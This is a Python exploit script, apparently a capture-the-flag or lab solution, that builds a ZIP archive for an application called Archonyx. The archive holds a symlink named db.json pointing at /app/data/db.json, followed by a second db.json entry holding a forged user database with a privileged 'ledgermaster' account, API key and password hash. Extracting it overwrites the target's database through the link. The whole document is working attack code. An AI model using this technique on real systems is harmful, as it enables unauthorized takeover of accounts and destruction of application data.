#!/usr/bin/env python3
"""Build the duplicate-entry database archive used in Archonyx."""

from __future__ import annotations

import argparse
import json
import stat
import zipfile
from pathlib import Path


DEFAULT_OUTPUT = Path("ledger_coup.zip")
DEFAULT_TARGET = "/app/data/db.json"


def build_archive(
    output: Path,
    target: str,
    username: str,
    password_hash: str,
    api_key: str,
) -> None:
    database = {
        "users": [
            {
                "username": username,
                "password": password_hash,
                "role": "ledgermaster",
                "verified": True,
                "apiKey": api_key,
                "drawsId": None,
            }
        ],
        "convoys": [],
    }

    with zipfile.ZipFile(output, "w") as archive:
        link = zipfile.ZipInfo("db.json")
        link.create_system = 3
        link.external_attr = (stat.S_IFLNK | 0o777) << 16
        link.compress_type = zipfile.ZIP_STORED
        archive.writestr(link, target)

        replacement = zipfile.ZipInfo("db.json")
        replacement.create_system = 3
        replacement.external_attr = (stat.S_IFREG | 0o600) << 16
        replacement.compress_type = zipfile.ZIP_STORED
        archive.writestr(
            replacement,
            json.dumps(database, indent=2),
        )


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Create the duplicate-entry ZIP used to replace Archonyx db.json."
        )
    )
    parser.add_argument("--username", required=True)
    parser.add_argument(
        "--password-hash",
        required=True,
        help="Precomputed bcrypt password hash.",
    )
    parser.add_argument("--api-key", required=True)
    parser.add_argument(
        "--output",
        type=Path,
        default=DEFAULT_OUTPUT,
        help=f"Output archive path. Default: {DEFAULT_OUTPUT}",
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Symlink target. Default: {DEFAULT_TARGET}",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    build_archive(
        args.output,
        args.target,
        args.username,
        args.password_hash,
        args.api_key,
    )
    print(f"created={args.output}")


if __name__ == "__main__":
    main()
